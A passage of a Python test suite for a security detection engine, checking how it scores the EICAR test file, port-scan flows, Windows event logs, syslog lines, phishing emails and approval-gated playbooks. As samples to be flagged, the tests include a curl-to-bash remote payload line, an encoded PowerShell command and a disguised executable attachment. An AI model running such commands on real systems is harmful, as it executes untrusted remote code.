        "xai_explanation": "Safe Risk: file triage.",
        "explanation_summary": "File triage.",
    })
    eicar = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"

    result = asyncio.run(analyze_file(
        category="malware",
        file=UploadFile(file=io.BytesIO(eicar), filename="eicar.com"),
        metadata="{}",
        user={"username": "analyst", "role": "analyst"},
    ))

    assert result["assessment"]["malware_scan"]["status"] == "matches_found"
    assert result["assessment"]["risk_level"] == "Critical"
    assert result["assessment"]["xai_explanation"].startswith("Critical Risk:")


def test_network_flow_and_api_rate_analytics_use_structured_fields():
    flows = {"flows": [{"src_ip": "198.51.100.7", "destination_ports": list(range(20, 45)), "bytes_out": 24_000_000, "bytes_in": 100_000}]}
    network_score, network_reasons, network_indicators = detection_engine.analyze_technical_activity(json.dumps(flows), "network")
    api_event = {"request_count": 2400, "window_seconds": 60}
    api_score, api_reasons, _ = detection_engine.analyze_technical_activity(json.dumps(api_event), "api_logs")

    assert network_score >= 80
    assert any("destination ports" in reason for reason in network_reasons)
    assert {item["name"] for item in network_indicators} >= {"Flow Port-Scan Breadth", "Outbound Flow Volume Ratio"}
    assert api_score >= 60
    assert any("requests per minute" in reason for reason in api_reasons)


def test_system_log_analytics_detect_security_events_and_failure_bursts():
    records = [
        {"event_id": 1102, "event_type": "audit_log_cleared"},
        {"event_id": 7045, "event_type": "service_installed", "image_path": "C:\\Users\\Public\\AppData\\Local\\Temp\\powershell.exe"},
        *[{"event_id": 4625, "event_type": "failed_login"} for _ in range(10)],
    ]
    score, reasons, indicators = detection_engine.analyze_technical_activity(json.dumps({"events": records}), "system_logs")

    assert score >= 90
    assert any("audit-log clearing" in reason for reason in reasons)
    assert any("10 failed authentication events" in reason for reason in reasons)
    assert {item["name"] for item in indicators} >= {"Audit Log Cleared", "New Service Installation", "Suspicious Service Executable", "System Authentication Failure Burst"}


def test_system_log_parser_accepts_windows_xml_jsonl_and_linux_syslog():
    windows_xml = (
        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
        "<System><EventID>1102</EventID><TimeCreated SystemTime=\"2026-09-30T10:00:00Z\" />"
        "<Computer>host-01</Computer></System><EventData /></Event>"
    )
    xml_score, xml_reasons, _ = detection_engine.analyze_technical_activity(windows_xml, "system_logs")
    windows_json_line = json.dumps({
        "Event": {
            "System": {"EventID": {"#text": "7045"}, "Computer": "host-02"},
            "EventData": {"Data": [{"@Name": "ImagePath", "#text": "C:\\Windows\\Temp\\powershell.exe"}]},
        },
    })
    jsonl_score, jsonl_reasons, _ = detection_engine.analyze_technical_activity(windows_json_line, "system_logs")
    encoded_process = json.dumps({
        "Event": {
            "System": {"EventID": {"#text": "4688"}},
            "EventData": {"Data": [
                {"@Name": "NewProcessName", "#text": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},
                {"@Name": "CommandLine", "#text": "powershell.exe -EncodedCommand SQBFAFgA"},
            ]},
        },
    })
    process_score, process_reasons, process_indicators = detection_engine.analyze_technical_activity(encoded_process, "system_logs")
    benign_process = json.dumps({"event_id": 4688, "event_type": "process_start", "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "command": "powershell.exe Get-Service"})
    benign_process_score, _, benign_process_indicators = detection_engine.analyze_technical_activity(benign_process, "system_logs")
    failed_syslog = "\n".join(
        f"Oct 11 22:14:{index:02d} host sshd[123]: Failed password for invalid user admin from 203.0.113.8 port 22 ssh2"
        for index in range(10)
    )
    syslog_score, syslog_reasons, _ = detection_engine.analyze_technical_activity(failed_syslog, "system_logs")
    shell_syslog = "Oct 11 22:14:16 host cron[456]: curl https://updates.example/payload | bash"
    shell_score, _, shell_indicators = detection_engine.analyze_technical_activity(shell_syslog, "system_logs")
    benign_syslog = "Oct 11 22:14:15 host sshd[123]: Accepted publickey for analyst from 203.0.113.8 port 22 ssh2"
    benign_score, benign_reasons, _ = detection_engine.analyze_technical_activity(benign_syslog, "system_logs")

    assert xml_score >= 60
    assert any("audit-log clearing" in reason for reason in xml_reasons)
    assert jsonl_score >= 50
    assert any("suspicious executable path" in reason for reason in jsonl_reasons)
    assert process_score >= 45
    assert any("download/encoded-command" in reason for reason in process_reasons)
    assert any(item["name"] == "Suspicious Process Creation" for item in process_indicators)
    assert benign_process_score == 15
    assert not any(item["name"] == "Suspicious Process Creation" for item in benign_process_indicators)
    assert syslog_score >= 60
    assert any("10 failed authentication events" in reason for reason in syslog_reasons)
    assert shell_score >= 45
    assert any(item["name"] == "Suspicious Process Creation" for item in shell_indicators)
    assert benign_score == 15
    assert benign_reasons == []


def test_eml_attachment_metadata_and_text_are_inspected():
    result = analyze_eml(
        b"From: sender@example.com\r\n"
        b"Subject: Document\r\n"
        b"MIME-Version: 1.0\r\n"
        b"Content-Type: multipart/mixed; boundary=sample\r\n\r\n"
        b"--sample\r\nContent-Type: text/plain; charset=utf-8\r\n"
        b"Content-Disposition: attachment; filename=details.txt\r\n\r\n"
        b"Visit https://credential-check.example/login\r\n"
        b"--sample\r\nContent-Type: application/octet-stream\r\n"
        b"Content-Disposition: attachment; filename=invoice.exe\r\n"
        b"Content-Transfer-Encoding: base64\r\n\r\n"
        b"TVqQ\r\n--sample--\r\n"
    )

    assert "credential-check.example" in result["payload"]
    assert len(result["attachments"]) == 2
    assert result["attachments"][0]["status"] == "text_content_scanned"
    assert result["attachments"][1]["status"] == "active_content_review"
    assert any(indicator["name"] == "Risky Email Attachment Type" for indicator in result["indicators"])


def test_category_playbooks_are_dry_run_and_approval_gated():
    playbooks = {playbook["id"]: playbook for playbook in load_playbooks()}
    assessment = {"risk_level": "Critical", "category": "ato"}

    plan = plan_playbook(playbooks["ato-containment"], assessment)
    wrong_category = plan_playbook(playbooks["ato-containment"], {"risk_level": "Critical", "category": "url"}, approved=True)

    assert len(playbooks) >= 4
    assert plan["matched"] is True
    assert plan["mode"] == "dry-run"
    assert wrong_category["matched"] is False
    assert wrong_category["actions"] == []
